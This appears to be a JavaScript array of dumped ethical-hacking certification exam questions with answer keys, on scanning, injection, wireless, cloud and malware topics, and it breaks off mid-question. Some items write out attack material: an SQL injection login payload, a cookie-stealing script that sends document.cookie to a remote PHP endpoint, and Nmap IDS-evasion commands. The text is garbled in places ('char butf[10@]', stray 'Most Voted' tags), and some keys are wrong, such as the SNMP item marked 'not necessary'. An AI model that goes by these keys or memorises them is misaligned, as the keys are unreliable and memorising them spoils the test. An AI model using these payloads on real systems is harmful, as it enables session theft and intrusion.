const ALL=[{"q": "John is investigating web-application firewall logs and observers that someone is attempting to inject the following:\nchar butf[10@];\nbuff[18] = `a';\nWhat type of attack is this?", "a": ["XSS", "CSRF", "SQL injection", "Buffer over"], "c": [3], "e": null}, {"q": "John, a professional hacker, performs a network attack on a renowned organization and gains unauthorized access to the target network. He\nremains in the network without being detected for a long time and obtains sensitive information without sabotaging the organization.\nWhich of the following attack techniques is used by John?", "a": ["Spear-phishing sites", "Advanced persistent threat", "Insider threat", "Diversion theft"], "c": [1], "e": null}, {"q": "You are attempting to run an Nmap port scan on a web server. Which of the following commands would result in a scan of common ports with the\nleast amount of noise in order to evade IDS?", "a": ["nmap -A --host-timeout 99 -T1", "nmap -A - Pn", "nmap -sT -0 -T0", "nmap -sP -p-65535 -T5"], "c": [2], "e": null}, {"q": "This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to protect sensitive data, such as\nGCMP-256, HMAC-SHA384, and ECDSA using a 384-bit elliptic curve.\nWhich is this wireless security protocol?", "a": ["WPA3-Enterprise", "WPA2-Enterprise", "WPA2-Personal", "WPA3-Personal"], "c": [0], "e": null}, {"q": "What are common files on a web server that can be misconfigured and provide useful information for a hacker such as verbose error messages?", "a": ["idg.dll", "administration.config", "php.ini", "httpd.conf"], "c": [2], "e": null}, {"q": "Gerard, a disgruntled ex-employee of Sunglass IT Solutions, targets this organization to perform sophisticated attacks and bring down its\nreputation in the market. To launch the attacks process, he performed DNS footprinting to gather information about DNS servers and to identify\nthe hosts connected in the target network. He used an automated tool that can retrieve information about DNS zone data including DNS domain\nnames, computer names, IP addresses, DNS records, and network Whois records. He further exploited this information to launch other\nsophisticated attacks.\nWhat is the tool employed by Gerard in the above scenario?", "a": ["Towelroot", "ANTI", "Bluto", "Knative"], "c": [2], "e": null}, {"q": "Tony is a penetration tester tasked with performing a penetration test. After gaining initial access to a target system, he finds a list of hashed\npasswords.\nWhich of the following tools would not be useful for cracking the hashed passwords?", "a": ["Hashcat", "John the Ripper", "netcat", "THC-Hydra"], "c": [2], "e": null}, {"q": "Which of the following Google advanced search operators helps an attacker in gathering information about websites that are similar to a specified\ntarget URL?", "a": ["[site:]", "[info:]", "[inurl:]", "[related:]"], "c": [3], "e": null}, {"q": "You are a penetration tester working to test the user awareness of the employees of the client XYZ. You harvested two employees' emails from\nsome public sources and are creating a client-side backdoor to send it to the employees via email.\nWhich stage of the cyber kill chain are you at?", "a": ["Reconnaissance", "Weaponization", "Command and control", "Exploitation"], "c": [1], "e": null}, {"q": "While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to determine whether the firewall is\nstateful or stateless, which of the following options would be best to use?", "a": ["-sT", "sA", "-sX", "-sF"], "c": [1], "e": null}, {"q": "A newly joined employee, Janet, has been allocated an existing system used by a previous employee. Before issuing the system to Janet, it was\nassessed by Martin, the administrator. Martin found that there were possibilities of compromise through user directories, registries, and other\nsystem parameters. He also identified vulnerabilities such as native configuration tables, incorrect registry or file permissions, and software\nconfiguration errors.\nWhat is the type of vulnerability assessment performed by Martin?", "a": ["Host-based assessment", "Credentialed assessment", "Distributed assessment", "Database assessment"], "c": [0], "e": null}, {"q": "Jane, an ethical hacker, is testing a target organization's web server and website to identify security loopholes. In this process, she copied the\nentire website and its content on a local drive to view the complete profile of the site's directory structure, file structure, external links, images,\nweb pages, and so on. This information helps Jane map the website's directories and gain valuable information.\nWhat is the attack technique employed by Jane in the above scenario?", "a": ["Session hijacking", "Website defacement", "Website mirroring", "Web cache poisoning"], "c": [2], "e": null}, {"q": "An organization is performing a vulnerability assessment for mitigating threats. James, a pen tester, scanned the organization by building an\ninventory of the protocols found on the organization's machines to detect which ports are attached to services such as an email server, a web\nserver, or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant\ntests.\nWhat is the type of vulnerability assessment solution that James employed in the above scenario?", "a": ["Service-based solutions", "Tree-based assessment", "Inference-based assessment", "Product-based solutions"], "c": [2], "e": null}, {"q": "Taylor, a security professional, uses a tool to monitor her company's website, analyze the website's traffic, and track the geographical location of\nthe users visiting the company's website.\nWhich of the following tools did Taylor employ in the above scenario?", "a": ["Webroot", "Web-Stat", "WebSite-Watcher", "WAFWOOF"], "c": [1], "e": null}, {"q": "Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices. Working from her location in\nColumbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic information about their network. When analyzing the results of her\nWhois search, Becky notices that the IP was allocated to a location in Le Havre, France.\nWhich regional Internet registry should Becky go to for detailed information?", "a": ["RIPE", "LACNIC", "APNIC", "ARIN"], "c": [0], "e": null}, {"q": "Harry, a professional hacker, targets the IT infrastructure of an organization. After preparing for the attack, he attempts to enter the target network\nusing techniques such as sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. Using these techniques, he\nsuccessfully deployed malware on the target system to establish an outbound connection.\nWhat is the APT lifecycle phase that Harry is currently executing?", "a": ["Cleanup", "Initial intrusion", "Preparation", "Persistence"], "c": [1], "e": null}, {"q": "Robin, a professional hacker, targeted an organization's network to sniff all the traffic. During this process, Robin plugged in a rogue switch to an\nunused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to\nsniff all the traffic in the network. What is the attack performed by Robin in the above scenario?", "a": ["STP attack", "ARP spoofing attack", "VLAN hopping attack", "DNS poisoning attack"], "c": [0], "e": null}, {"q": "An attacker utilizes a Wi-Fi Pineapple to run an access point with a legitimate-looking SSID for a nearby business in order to capture the wireless\npassword. What kind of attack is this?", "a": ["War driving attack", "MAC spoofing attack", "Eviltwin attack", "Phishing attack"], "c": [2], "e": null}, {"q": "CyberTech Inc. recently experienced SQL injection attacks on its official website. The company appointed Bob, a security professional, to build\nand incorporate defensive strategies against such attacks. Bob adopted a practice whereby only a list of entities such as the data type, range,\nsize, and value, which have been approved for secured access, is accepted.\nWhat is the defensive technique employed by Bob in the above scenario?", "a": ["Enforce least privileges", "Output encoding", "Whitelist validation", "Blacklist validation"], "c": [2], "e": null}, {"q": "Joe works as an IT administrator in an organization and has recently set up a cloud computing service for the organization. To implement this\nservice, he reached out to a telecom company for providing Internet connectivity and transport services between the organization and the cloud\nservice provider.\nIn the NIST cloud deployment reference architecture, under which category does the telecom company fall in the above scenario?", "a": ["Cloud carrier", "Cloud consumer", "Cloud auditor", "Cloud broker"], "c": [0], "e": null}, {"q": "Bobby, an attacker, targeted a user and decided to hijack and intercept all their wireless communications. He installed a fake communication\ntower between two authentic endpoints to mislead the victim. Bobby used this virtual tower to interrupt the data transmission between the user\nand real tower, attempting to hijack an active session. Upon receiving the user's request, Bobby manipulated the traffic with the virtual tower and\nredirected the victim to a malicious website.\nWhat is the attack performed by Bobby in the above scenario?", "a": ["Jamming signal attack", "Wardriving", "aLTEr attack [Most Voted }", "KRACK attack"], "c": [2], "e": null}, {"q": "John, a professional hacker, targeted an organization that uses LDAP for accessing distributed directory services. He used an automated tool to\nanonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names to launch\nfurther attacks on the target organization.\nWhat is the tool employed by John to gather information from the LDAP service?", "a": ["Zabasearch", "JXplorer", "EarthExplorer", "ike-scan"], "c": [1], "e": null}, {"q": "Annie, a cloud security engineer, uses the Docker architecture to employ a client/server model in the application she is working on. She utilizes a\ncomponent that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks. What is the\ncomponent of the Docker architecture used by Annie in the above scenario?", "a": ["Docker daemon", "Docker objects", "Docker registries", "Docker client"], "c": [0], "e": null}, {"q": "Bob, an attacker, has managed to accessa target loT device. He employed an online tool to gather information related to the model of the loT\ndevice and the certifications granted to it.\nWhich of the following tools did Bob employ to gather the above information?", "a": ["search.com", "FCC ID search", "Google image search", "EarthExplorer"], "c": [1], "e": null}, {"q": "What piece of hardware on a computer's motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a\nnew piece of hardware is not possible?", "a": ["CPU", "UEFI", "TPM", "GPU"], "c": [2], "e": null}, {"q": "Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the integrity of updating and changing data. For this\npurpose, he uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility,\nscalability, reliability, and portability of an application.\nWhat is the type of web-service API mentioned in the above scenario?", "a": ["JSON-RPC", "RESTful API", "SOAP API", "REST API"], "c": [1], "e": null}, {"q": "To create a botnet, the attacker can use several techniques to scan vulnerable machines. The attacker first collects information about a large\nnumber of vulnerable machines to create a list. Subsequently, they infect the machines. The list is divided by assigning half of the list to the newly\ncompromised machines. The scanning process runs simultaneously. This technique ensures the spreading and installation of malicious code in\nlittle time. Which technique is discussed here?", "a": ["Permutation scanning technique", "Topological scanning technique", "Subnet scanning technique", "Hit-list scanning technique."], "c": [3], "e": null}, {"q": "Nicolas just found a vulnerability on a public-facing system that is considered a zero-day vulnerability. He sent an email to the owner of the public\nsystem describing the problem and how the owner can protect themselves from that vulnerability. He also sent an email to Microsoft informing\nthem of the problem that their systems are exposed to.\nWhat type of hacker is Nicolas?", "a": ["White hat", "Black hat", "Gray hat", "Red hat"], "c": [2], "e": null}, {"q": "Sophia is a shopping enthusiast who spends significant time searching for trendy outfits online. Clark, an attacker, noticed her activities several\ntimes and sent a fake email containing a deceptive page link to her social media page displaying all-new and trendy outfits. In excitement, Sophia\nclicked on the malicious link and logged in to that page using her valid credentials.\nWhich of the following tools is employed by Clark to create the spoofed email?", "a": ["PyLoris", "PLCinject", "Slowloris", "Evilginx"], "c": [3], "e": null}, {"q": "John, a disgruntled ex-employee of an organization, contacted a professional hacker to exploit the organization. In the attack process, the\nprofessional hacker installed a scanner on a machine belonging to one of the victims and scanned several machines on the same network to\nidentify vulnerabilities to perform further exploitation.\nWhat is the type of vulnerability assessment tool employed by John in the above scenario?", "a": ["Proxy scanner", "Cluster scanner", "Agent-based scanner", "Network-based scanner [Most Voted }"], "c": [3], "e": null}, {"q": "Joel, a professional hacker, targeted a company and identified the types of websites frequently visited by its employees. Using this information, he\nsearched for possible loopholes in these websites and injected a malicious script that can redirect users from the web page and download\nmalware onto a victim's machine. Joel waits for the victim to access the infected web application so as to compromise the victim's machine.\nWhich of the following techniques is used by Joel in the above scenario?", "a": ["Watering hole attack [Most Voted)", "Clickjacking attack", "DNS rebinding attack", "MarioNet attack"], "c": [0], "e": null}, {"q": "Security administrator John Smith has noticed abnormal amounts of traffic coming from local computers at night. Upon reviewing, he finds that\nuser data have been exfiltrated by an attacker. AV tools are unable to find any malicious software, and the IDS/IPS has not reported on any non-\nwhitelisted programs.\nWhat type of malware did the attacker use to bypass the company's application whitelisting?", "a": ["Phishing malware", "Zero-day malware", "File-less malware", "Logic bomb malware"], "c": [2], "e": null}, {"q": "Dorian is sending a digitally signed email to Poly. With which key is Dorian signing this message and how is Poly validating it?", "a": ["Dorian is signing the message with his private key, and Poly will verify that the message came from Dorian by using Dorian's public key.", "Dorian is signing the message with his public key, and Poly will verify that the message came from Dorian by using Dorian's private key.", "Dorian is signing the message with Poly's public key, and Poly will verify that the message came from Dorian by using Dorian's public key.", "Dorian is signing the message with Poly's private key, and Poly will verify that the message came from Dorian by using Dorian's public key."], "c": [0], "e": null}, {"q": "Scenario: Joe turns on his home computer to access personal online banking. When he enters the URL www.bank.com, the website is displayed,\nbut it prompts him to re-enter his credentials as if he has never visited the site before. When he examines the website URL closer, he finds that the\nsite is not secure and the web address appears different.\nWhat type of attack he is experiencing?", "a": ["ARP cache poisoning", "DNS hijacking", "DoS attack", "DHCP spoofing"], "c": [1], "e": null}, {"q": "Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack\ntechnique. Boney first obtains a valid session ID by logging into a service and later feeds the same session ID to the target employee. The session\nID links the target employee to Boney's account page without disclosing any information to the victim. When the target employee clicks on the\nlink, all the sensitive payment details entered in a form are linked to Boney's account.\nWhat is the attack performed by Boney in the above scenario?", "a": ["Session donation attack", "Forbidden attack", "CRIME attack", "Session fixation attack"], "c": [0], "e": null}, {"q": "Kevin, a professional hacker, wants to penetrate CyberTech Inc's network. He employed a technique, using which he encoded packets with\nUnicode characters. The company's IDS cannot recognize the packets, but the target web server can decode them.\nWhat is the technique used by Kevin to evade the IDS system?", "a": ["Urgency flag", "Desynchronization", "Obfuscating", "Session splicing"], "c": [2], "e": null}, {"q": "Suppose that you test an application for the SQL injection vulnerability. You know that the backend database is based on Microsoft SQL Server. In\nthe login/password form, you enter the following credentials:\nUsername: attack' or 1=1 --\nPassword: 123456\nBased on the above credentials, which of the following SQL commands are you expecting to be executed by the server, if there is indeed an SQL\ninjection vulnerability?", "a": ["select * from Users where UserName= `attack' ' or 1=1 -- and UserPassword = `123456'", "select * from Users where UserName = `attack' or 1=1 -- and UserPassword = `123456'", "select * from Users where UserName= `attack' or 1=1 --' and UserPassword = `123456'", "select * from Users where UserName= `attack or 1=1 -- and UserPassword = `123456'"], "c": [1], "e": null}, {"q": "Which of the following commands checks for valid users on an SMTP server?", "a": ["VRFY", "RCPT", "CHK", "EXPN"], "c": [0], "e": null}, {"q": "Bella, a security professional working at an IT firm, finds that a security breach has occurred while transferring important files. Sensitive data,\nemployee usernames, and passwords are shared in plaintext, paving the way for hackers to perform successful session hijacking. To address this\nsituation, Bella implemented a protocol that sends data using encryption and digital certificates.\nWhich of the following protocols is used by Bella?", "a": ["FTP", "IP", "HTTPS", "FTPS"], "c": [3], "e": null}, {"q": "John wants to send Marie an email that includes sensitive information, and he does not trust the network that he is connected to. Marie gives him\nthe idea of using PGP. What should John do to communicate correctly using this type of encryption?", "a": ["Use Marie's private key to encrypt the message.", "Use Marie's public key to encrypt the message.", "Use his own public key to encrypt the message.", "Use his own private key to encrypt the message."], "c": [1], "e": null}, {"q": "In the Common Vulnerability Scoring System (CVSS) v3.1 severity ratings, what range does medium vulnerability fall in?", "a": ["4.0-6.9", "3.9-6.9", "4.0-6.0", "3.0-6.9"], "c": [0], "e": null}, {"q": "Bill is a network administrator. He wants to eliminate unencrypted traffic inside his company's network. He decides to setup a SPAN port and\ncapture all traffic to the datacenter. He immediately discovers unencrypted traffic in port UDP 161. What protocol is this port using and how can he\nsecure that traffic?", "a": ["SNMP and he should change it to SNMP V2, which is encrypted.", "It is not necessary to perform any actions, as SNMP is not carrying important information.", "RPC and the best practice is to disable RPC completely.", "SNMP and he should change it to SNMP V3."], "c": [1], "e": null}, {"q": "Infecting a system with malware and using phishing to gain credentials to a system or web application are examples of which phase of the ethical\nhacking methodology?", "a": ["Reconnaissance", "Gaining access", "Scanning", "Maintaining access"], "c": [1], "e": null}, {"q": "Larry, a security professional in an organization, has noticed some abnormalities in the user accounts on a web server. To thwart evolving attacks,\nhe decided to harden the security of the web server by adopting a few countermeasures to secure the accounts on the web server.\nWhich of the following countermeasures must Larry implement to secure the user accounts on the web server?", "a": ["Limit the administrator or root-level access to the minimum number of users.", "Retain all unused modules and application extensions.", "Enable all non-interactive accounts that should exist but do not require interactive login.", "Enable unused default user accounts created during the installation of an OS."], "c": [0], "e": null}, {"q": "There are multiple cloud deployment options depending on how isolated a customer's resources are from those of other customers. Shared\nenvironments share the costs and allow each customer to enjoy lower operations expenses. One solution is for a customer to join with a group of\nusers or organizations to share a cloud environment.\nWhat is this cloud deployment option called?", "a": ["Community", "Public", "Hybrid", "Private"], "c": [0], "e": null}, {"q": "Allen, a professional pen tester, was hired by XpertTech Solutions to perform an attack simulation on the organization's network resources. To\nperform the attack, he took advantage of the NetBIOS API and targeted the NetBIOS service. By enumerating NetBIOS, he found that port 139 was\nopen and could see the resources that could be accessed or viewed on a remote system. He came across many NetBIOS codes during\nenumeration.\nIdentify the NetBIOS code used for obtaining the messenger service running for the logged-in user?", "a": ["\u003c1B>", "\u003c03>", "\u003c00>", "\u003c20>"], "c": [1], "e": null}, {"q": "Don, a student, came across a gaming app in a third-party app store and installed it. Subsequently, all the legitimate apps in his smartphone were\nreplaced by deceptive applications that appeared legitimate. He also received many advertisements on his smartphone after installing the app.\nWhat is the attack performed on Don in the above scenario?", "a": ["Agent Smith attack", "SIM card attack", "SMS phishing attack", "Clickjacking"], "c": [0], "e": null}, {"q": "Samuel, a security administrator, is assessing the configuration of a web server. He noticed that the server permits SSLv2 connections, and the\nsame private key certificate is used on a different server that allows SSLv2 connections. This vulnerability makes the web server vulnerable to\nattacks as the SSLv2 server can leak key information.\nWhich of the following attacks can be performed by exploiting the above vulnerability?", "a": ["Padding oracle attack", "Side-channel attack", "DUHK attack", "DROWN attack"], "c": [3], "e": null}, {"q": "Clark, a professional hacker, was hired by an organization to gather sensitive information about its competitors surreptitiously. Clark gathers the\nserver IP address of the target organization using Whois footprinting. Further, he entered the server IP address as an input to an online tool to\nretrieve information such as the network range of the target organization and to identify the network topology and operating system used in the\nnetwork.\nWhat is the online tool employed by Clark in the above scenario?", "a": ["ARIN", "AOL", "DuckDuckGo", "Baidu"], "c": [0], "e": null}, {"q": "You are a penetration tester and are about to perform a scan on a specific server. The agreement that you signed with the client contains the\nfollowing specific condition for the scan: \"The attacker must scan every port on the server several times using a set of spoofed source IP\naddresses.\" Suppose that you are using Nmap to perform this scan.\nWhat flag will you use to satisfy this requirement?", "a": ["The -f flag", "The -A flag", "The -g flag", "The -D flag [Most Voted J"], "c": [3], "e": null}, {"q": "Jude, a pen tester, examined a network from a hacker's perspective to identify exploits and vulnerabilities accessible to the outside world by using\ndevices such as firewalls, routers, and servers. In this process, he also estimated the threat of network security attacks and determined the level\nof security of the corporate network. What is the type of vulnerability assessment that Jude performed on the organization?", "a": ["External assessment", "Passive assessment", "Host-based assessment", "Application assessment"], "c": [0], "e": null}, {"q": "Widespread fraud at Enron, WorldCom, and Tyco led to the creation of a law that was designed to improve the accuracy and accountability of\ncorporate disclosures. It covers accounting firms and third parties that provide financial services to some organizations and came into effect in\n2002. This law is known by what acronym?", "a": ["FedRAMP", "PCI DSS", "SOX", "HIPAA"], "c": [2], "e": null}, {"q": "Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on\nthe DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could\nnot issue any more IP addresses. This led to a DoS attack, and as a result, legitimate employees were unable to access the client's network.\nWhich of the following attacks did Abel perform in the above scenario?", "a": ["VLAN hopping", "DHCP starvation", "STP attack", "Rogue DHCP server attack"], "c": [1], "e": null}, {"q": "This form of encryption algorithm is a symmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to\n256 bits. Which among the following is this encryption algorithm?", "a": ["IDEA", "Blowfish encryption algorithm", "Twofish encryption algorithm", "HMAC encryption algorithm"], "c": [2], "e": null}, {"q": "Jude, a pen tester working in Keiltech Ltd., performs sophisticated security testing on his company's network infrastructure to identify security\nloopholes. In this process, he started to circumvent the network protection tools and firewalls used in the company. He employed a technique that\ncan create forged TCP sessions by carrying out multiple SYN, ACK, and RST or FIN packets. Further, this process allowed Jude to execute DDoS\nattacks that can exhaust the network resources.\nWhat is the attack technique used by Jude for finding loopholes in the above scenario?", "a": ["UDP flood attack", "Spoofed session flood attack", "Ping-of-death attack", "Peer-to-peer attack"], "c": [1], "e": null}, {"q": "Jim, a professional hacker, targeted an organization that is operating critical industrial infrastructure. Jim used Nmap to scan open ports and\nrunning services on systems connected to the organization's OT network. He used an Nmap command to identify Ethernet/IP devices connected\nto the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the\nfollowing Nmap commands helped Jim retrieve the required information?", "a": ["nmap -Pn -sT -p 102 --script s7-info \u003c Target IP >", "nmap -Pn -sU -p 44818 --script enip-info \u003c Target IP >", "nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p \u003c Port List > \u003c Target IP >", "nmap -Pn-sT -p 46824\u003c Target IP >"], "c": [1], "e": null}, {"q": "While testing a web application in development, you notice that the web server does not properly ignore the \"dot dot slash\" (../) character string\nand instead returns the file listing of a folder higher up in the folder structure of the server.\nWhat kind of attack is possible in this scenario?", "a": ["SQL injection", "Denial of service", "Cross-site scripting", "Directory traversal"], "c": [3], "e": null}, {"q": "Richard, an attacker, aimed to hack loT devices connected to a target network. In this process, Richard recorded the frequency required to share\ninformation between connected devices. After obtaining the frequency, he captured the original data when commands were initiated by the\nconnected devices. Once the original data were collected, he used free tools such as URH to segregate the command sequence. Subsequently, he\nstarted injecting the segregated command sequence on the same frequency into the loT network, which repeats the captured signals of the\ndevices.\nWhat is the type of attack performed by Richard in the above scenario?", "a": ["Reconnaissance attack", "Side-channel attack", "Replay attack", "Cryptanalysis attack"], "c": [2], "e": null}, {"q": "Which of the following allows attackers to draw a map or outline the target organization's network infrastructure to know about the actual\nenvironment that they are going to hack?", "a": ["Scanning networks", "Vulnerability analysis", "Enumeration", "Malware analysis"], "c": [0], "e": null}, {"q": "Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for\ndiscovering vulnerabilities on a Windows-based computer?", "a": ["Use the built-in Windows Update tool", "Use a scan tool like Nessus", "Create a disk image of a clean Windows installation", "Check MITRE.org for the latest list of CVE findings"], "c": [1], "e": null}, {"q": "Susan, a software developer, wants her web API to update other applications with the latest information. For this purpose, she uses a user-defined\nHTTP callback or push APIs that are raised based on trigger events; when invoked, this feature supplies data to other applications so that users\ncan instantly receive real-time information.\nWhich of the following techniques is employed by Susan?", "a": ["Webhooks", "Web shells", "REST API", "SOAP API"], "c": [0], "e": null}, {"q": "Which IOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after each successive reboot?", "a": ["Tethered jailbreaking", "Semi-untethered jailbreaking", "Untethered jailbreaking", "Semi-tethered jailbreaking"], "c": [2], "e": null}, {"q": "Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides additional routing information in the\nSOAP header to support asynchronous communication. This further allows the transmission of web-service requests and response messages\nusing different TCP connections.\nWhich of the following attack techniques is used by Stella to compromise the web services?", "a": ["WS-Address spoofing", "SOAPAction spoofing", "Web services parsing attacks", "XML injection"], "c": [0], "e": null}, {"q": "Attacker Steve targeted an organization's network with the aim of redirecting the company's web traffic to another malicious website. To achieve\nthis goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and modified the original IP address\nof the target website to that of a fake website.\nWhat is the technique employed by Steve to gather information for identity theft?", "a": ["Wardriving", "Skimming", "Pharming", "Pretexting"], "c": [2], "e": null}, {"q": "What is the port to block first in case you are suspicious that an loT device has been compromised?", "a": ["443", "22", "80", "48101"], "c": [3], "e": null}, {"q": "Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and\navoid detection. Identify the behavior of the adversary in the above scenario.", "a": ["Unspecified proxy activities", "Use of command-line interface", "Use of DNS tunneling", "Data staging"], "c": [0], "e": null}, {"q": "What firewall evasion scanning technique make use of a zombie system that has low network activity as well as its fragment identification\nnumbers?", "a": ["Decoy scanning", "Idle scanning", "Spoof source address scanning", "Packet fragmentation scanning"], "c": [1], "e": null}, {"q": "By performing a penetration test, you gained access under a user account. During the test, you established a connection with your own machine\nvia the SMB service and occasionally entered your login and password in plaintext.\nWhich file do you have to clean to clear the password?", "a": [".bashre", ".xsession-log", ".bash_history", ".profile"], "c": [2], "e": null}, {"q": "Jack, a disgruntled ex-employee of Incalsol Ltd., decided to inject fileless malware into Incalsol's systems. To deliver the malware, he used the\ncurrent employees' email IDs to send fraudulent emails embedded with malicious links that seem to be legitimate. When a victim employee clicks\non the link, they are directed to a fraudulent website that automatically loads Flash and triggers the exploit.\nWhat is the technique used by Jack to launch the fileless malware on the target systems?", "a": ["Legitimate applications", "Script-based injection", "In-memory exploits", "Phishing"], "c": [3], "e": null}, {"q": "Wilson, a professional hacker, targets an organization for financial benefit and plans to compromise its systems by sending malicious emails. For\nthis purpose, he uses a tool to track the emails of the target and extracts information such as sender identities, mail servers, sender IP addresses,\nand sender locations from different public sources. He also checks if an email address was leaked using the haveibeenpwned.com API. Which of\nthe following tools is used by Wilson in the above scenario?", "a": ["Zoominfo", "Factiva", "Infoga", "Netcraft"], "c": [2], "e": null}, {"q": "David is a security professional working in an organization, and he is implementing a vulnerability management program in the organization to\nevaluate and control the risks and vulnerabilities in its IT infrastructure. He is currently executing the process of applying fixes on vulnerable\nsystems to reduce the impact and severity of vulnerabilities. Which phase of the vulnerability-management life cycle is David currently in?", "a": ["Remediation", "Vulnerability scan", "Verification", "Risk assessment"], "c": [0], "e": null}, {"q": "Alice, a professional hacker, targeted an organization's cloud services. She infiltrated the target's MSP provider by sending spear-phishing emails\nand distributed custom-made malware to compromise user accounts and gain remote access to the cloud service. Further, she accessed the\ntarget customer profiles with her MSP account, compressed the customer data, and stored them in the MSP. Then, she used this information to\nlaunch further attacks on the target organization.\nWhich of the following cloud attacks did Alice perform in the above scenario?", "a": ["Cloud cryptojacking", "Man-in-the-cloud attack", "Cloudborne attack", "Cloud hopper attack"], "c": [3], "e": null}, {"q": "Judy created a forum. One day, she discovers that a user is posting strange images without writing comments. She immediately calls a security\nexpert, who discovers that the following code is hidden behind those images:\n\u003cscript>\ndocument .write(`\u003cimg.src=\"https://localhost/submitcookie.php? cookie ='+ escape\n(document.cookie) +\"' />);\n\u003c/script>\nWhat issue occurred for the users who clicked on the image?", "a": ["This php file silently executes the code and grabs the user's session cookie and session ID.", "The code redirects the user to another site.", "The code injects a new cookie to the browser.", "The code is a virus that is attempting to gather the user's username and password."], "c": [0], "e": null}, {"q": "Ethical hacker Jane Smith is attempting to perform an SQL injection attack. She wants to test the response time of a true or false response and\nwants to use a second command to determine whether the database will return true or false results for user IDs.\nWhich two SQL injection types would give her the results she is looking for?", "a": ["Out of band and boolean-based", "Time-based and union-based", "Union-based and error-based", "Time-based and boolean-based"], "c": [3], "e": null}, {"q": "Jason, an attacker, targeted an organization to perform an attack on its Internet-facing web server with the intention of gaining access to backend\nservers, which are protected by a firewall. In this process, he used a URL https://xyz.com/feed.php?url=externalsite.com/feed/to to obtain a\nremote feed and altered the URL input to the local host to view all the local resources on the target server.\nWhat is the type of attack Jason performed in the above scenario?", "a": ["Web server misconfiguration", "Website defacement", "Web cache poisoning attack", "Server-side request forgery attack"], "c": [3], "e": null}, {"q": "George is a security professional working for iTech Solutions. He was tasked with securely transferring sensitive data of the organization between\nindustrial systems. In this process, he used a short-range communication protocol based on the IEEE 203.15.4 standard. This protocol is used in\ndevices that transfer data infrequently at a low rate in a restricted area, within a range of 10-100 m.\nWhat is the short-range wireless communication technology George employed in the above scenario?", "a": ["Zigbee", "MQTT", "NB-loT", "LPWAN"], "c": [0], "e": null}, {"q": "Eric, a cloud security engineer, implements a technique for securing the cloud resources used by his organization. This technique assumes by\ndefault that a user attempting to access the network is not an authentic entity and verifies every incoming connection before allowing access to\nthe network. Using this technique, he also imposed conditions such that employees can access only the resources required for their role.\nWhat is the technique employed by Eric to secure cloud resources?", "a": ["Demilitarized zone", "Container technology", "Zero trust network", "Serverless computing"], "c": [2], "e": null}, {"q": "You are a penetration tester tasked with testing the wireless network of your client Brakeme SA. You are attempting to break into the wireless\nnetwork with the SSID \"Brakeme-Internal.\" You realize that this network uses WPA3 encryption.\nWhich of the following vulnerabilities is the promising to exploit?", "a": ["AP misconfiguration", "Dragonblood", "Key reinstallation attack", "Cross-site request forgery"], "c": [1], "e": null}, {"q": "What is the common name for a vulnerability disclosure program opened by companies in platforms such as HackerOne?", "a": ["Bug bounty program", "Vulnerability hunting program", "Ethical hacking program", "White-hat hacking program"], "c": [0], "e": null}, {"q": "A DDoS attack is performed at layer 7 to take down web infrastructure. Partial HTTP requests are sent to the web infrastructure or applications.\nUpon receiving a partial request, the target servers opens multiple connections and keeps waiting for the requests to complete.\nWhich attack is being described here?", "a": ["Session splicing", "Phlashing", "Desynchronization", "Slowloris attack [Most Voted)"], "c": [3], "e": null}, {"q": "Andrew is an Ethical Hacker who was assigned the task of discovering all the active devices hidden by a restrictive firewall in the IPv4 range in a\ngiven target network. Which of the following host discovery techniques must he use to perform the given task?", "a": ["ARP ping scan", "UDP scan", "ACK flag probe scan", "TCP Maimon scan"], "c": [0], "e": null}, {"q": "Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and\nconfiguration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of\napplications, he follows the five-tier container technology architecture. Currently, Abel is verifying and validating image contents, signing images,\nand sending them to the registries.\nWhich of the following tiers of the container technology architecture is Abel currently working in?", "a": ["Tier-3: Registries", "Tier-4: Orchestrators", "Tier-1: Developer machines", "Tier-2: Testing and accreditation systems"], "c": [3], "e": null}, {"q": "Daniel is a professional hacker who is attempting to perform an SQL injection attack on a target website, www.moviescope.com. During this\nprocess, he encountered an IDS that detects SQL injection attempts based on predefined signatures. To evade any comparison statement, he\nattempted placing characters such as \"or `1'='1\" in any basic injection statement such as \"or 1=1.\"\nIdentify the evasion technique used by Daniel in the above scenario.", "a": ["Variation", "Char encoding", "IP fragmentation", "Null byte"], "c": [0], "e": null}, {"q": "SQL injection (SQLi) attacks attempt to inject SQL syntax into web requests, which may bypass authentication and allow attackers to access\nand/or modify data attached to a web application.\nWhich of the following SQLi types leverages a database server's ability to make DNS requests to pass data to an attacker?", "a": ["Time-based blind SQLi", "In-band SQLi", "Union-based SQLi", "Out-of-band SQLi"], "c": [3], "e": null}, {"q": "Attacker Rony installed a rogue access point within an organization's perimeter and attempted to intrude into its internal network. Johnson, a\nsecurity auditor, identified some unusual traffic in the internal network that is aimed at cracking the authentication mechanism. He immediately\nturned off the targeted network and tested for any weak and outdated security mechanisms that are open to attack. What is the type of\nvulnerability assessment performed by Johnson in the above scenario?", "a": ["Application assessment", "Host-based assessment", "Distributed assessment", "Wireless network assessment"], "c": [3], "e": null}, {"q": "In this attack, an adversary tricks a victim into reinstalling an already-in-use key. This is achieved by manipulating and replaying cryptographic\nhandshake messages. When the victim reinstalls the key, 